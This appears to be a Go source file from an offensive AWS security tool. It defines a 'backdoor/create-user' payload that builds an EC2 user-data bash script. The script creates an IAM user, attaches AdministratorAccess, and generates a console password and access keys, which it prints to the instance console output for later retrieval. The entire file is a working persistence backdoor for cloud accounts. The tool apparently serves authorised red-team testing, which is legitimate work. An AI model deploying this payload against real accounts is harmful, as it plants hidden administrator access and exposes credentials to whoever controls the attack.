package ec2

import (
	"encoding/json"
	"fmt"
	"github.com/DataDog/pathrunner/pkg/modules"
	"github.com/DataDog/pathrunner/pkg/payloads"
	"strings"
)

type BackdoorCreateUserPayload struct{}

func init() {
	payloads.Register(&BackdoorCreateUserPayload{})
}

func (p *BackdoorCreateUserPayload) GetName() string {
	return "backdoor/create-user"
}

func (p *BackdoorCreateUserPayload) GetDescription() string {
	return "Create an IAM user with administrator privileges and optional console/programmatic access via EC2 user-data"
}

func (p *BackdoorCreateUserPayload) GetTags() []string {
	return []string{
		payloads.TagServiceEC2,
		payloads.TagLanguageBash,
		payloads.TagTechniqueBackdoor,
	}
}

func (p *BackdoorCreateUserPayload) GetOptions() []modules.Option {
	return []modules.Option{
		{
			Name:        "USER_NAME",
			Description: "Name for the backdoor user (auto-generated if empty)",
			Required:    false,
			Default:     "",
		},
		{
			Name:        "CONSOLE_ACCESS",
			Description: "Create a console login profile with a random password",
			Required:    false,
			Default:     "true",
		},
		{
			Name:        "ACCESS_KEY",
			Description: "Create programmatic access keys",
			Required:    false,
			Default:     "true",
		},
	}
}

func (p *BackdoorCreateUserPayload) Validate(options map[string]string) error {
	return nil
}

func (p *BackdoorCreateUserPayload) GenerateCode(options map[string]string) (string, error) {
	userName := options["USER_NAME"]
	consoleAccess := options["CONSOLE_ACCESS"] != "false"
	accessKey := options["ACCESS_KEY"] != "false"

	userNameBash := ""
	if userName != "" {
		userNameBash = fmt.Sprintf(`USER_NAME="%s"`, userName)
	} else {
		userNameBash = `USER_NAME="pathrunner-admin-$(date +%s)"`
	}

	consoleBlock := ""
	if consoleAccess {
		consoleBlock = `
# Generate random password (16 chars, mixed case + digits + symbols)
PASSWORD=$(cat /dev/urandom | tr -dc 'A-Za-z0-9!@#$%' | head -c 16)

echo "Creating console login profile..."
aws iam create-login-profile \
    --user-name "$USER_NAME" \
    --password "$PASSWORD" \
    --no-password-reset-required 2>&1

if [ $? -eq 0 ]; then
    ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)
    echo "Console URL: https://${ACCOUNT_ID}.signin.aws.amazon.com/console"
    echo "Console Username: $USER_NAME"
    echo "Console Password: $PASSWORD"
else
    echo "WARNING: Could not create login profile"
fi
`
	}

	accessKeyBlock := ""
	if accessKey {
		accessKeyBlock = `
echo "Creating access keys..."
KEY_OUTPUT=$(aws iam create-access-key --user-name "$USER_NAME" 2>&1)

if [ $? -eq 0 ]; then
    AK_ID=$(echo "$KEY_OUTPUT" | grep -o '"AccessKeyId": "[^"]*"' | cut -d'"' -f4)
    AK_SECRET=$(echo "$KEY_OUTPUT" | grep -o '"SecretAccessKey": "[^"]*"' | cut -d'"' -f4)

    echo "--- PATHFINDER_IDENTITY_DATA ---"
    echo "NAME=backdoor/$USER_NAME"
    echo "TYPE=keys"
    echo "ACCESS_KEY_ID=$AK_ID"
    echo "SECRET_ACCESS_KEY=$AK_SECRET"
    echo "AUTO_SWITCH=false"
    echo "--- END_PATHFINDER_IDENTITY_DATA ---"
else
    echo "WARNING: Could not create access keys"
fi
`
	}

	userDataScript := fmt.Sprintf(`#!/bin/bash
exec > >(tee /var/log/pathrunner-create-user.log|logger -t pathrunner -s 2>/dev/console) 2>&1

echo "Pathrunner Create User Payload"
echo ""

sleep 10

%s

echo "Creating IAM user: $USER_NAME..."
CREATE_OUTPUT=$(aws iam create-user --user-name "$USER_NAME" 2>&1)

if [ $? -ne 0 ]; then
    echo "FAILED: Could not create user: $CREATE_OUTPUT"
    exit 1
fi

USER_ARN=$(echo "$CREATE_OUTPUT" | grep -o '"Arn": "[^"]*"' | cut -d'"' -f4)
echo "User created: $USER_ARN"

echo "Attaching AdministratorAccess policy..."
aws iam attach-user-policy \
    --user-name "$USER_NAME" \
    --policy-arn "arn:aws:iam::aws:policy/AdministratorAccess"

if [ $? -ne 0 ]; then
    echo "FAILED: Could not attach policy"
    exit 1
fi

echo "Policy attached successfully"
%s%s
echo "SUCCESS: Backdoor user $USER_NAME created with AdministratorAccess"
echo "Create user payload complete"
`, userNameBash, consoleBlock, accessKeyBlock)

	return userDataScript, nil
}

func (p *BackdoorCreateUserPayload) ProcessResult(result string) (string, error) {
	var instanceData map[string]interface{}
	if err := json.Unmarshal([]byte(result), &instanceData); err != nil {
		return result, nil
	}

	var output strings.Builder
	output.WriteString("=== Create User Payload Results ===\n\n")

	if instanceID, ok := instanceData["instance_id"].(string); ok {
		output.WriteString("Instance ID: " + instanceID + "\n")
	}

	if state, ok := instanceData["state"].(string); ok {
		output.WriteString("Instance State: " + state + "\n")
	}

	output.WriteString("\nThe EC2 instance will create a backdoor IAM user on boot.\n")
	output.WriteString("Allow 2-3 minutes for the script to complete.\n\n")

	output.WriteString("Credentials will be available in the instance console output.\n")
	output.WriteString("To retrieve: aws ec2 get-console-output --instance-id <INSTANCE_ID>\n\n")

	output.WriteString("Look for PATHFINDER_IDENTITY_DATA markers in the output for auto-import.\n")

	return output.String(), nil
}

func (p *BackdoorCreateUserPayload) ReportSideEffects(options map[string]string) []modules.CreatedResource {
	userName := options["USER_NAME"]
	if userName == "" {
		userName = "pathrunner-admin-<timestamp>"
	}

	return []modules.CreatedResource{
		{
			Type:          "iam:user",
			Name:          userName,
			CleanupMethod: "iam:DeleteUser",
			Metadata: map[string]string{
				"console_access": options["CONSOLE_ACCESS"],
				"access_key":     options["ACCESS_KEY"],
			},
		},
	}
}
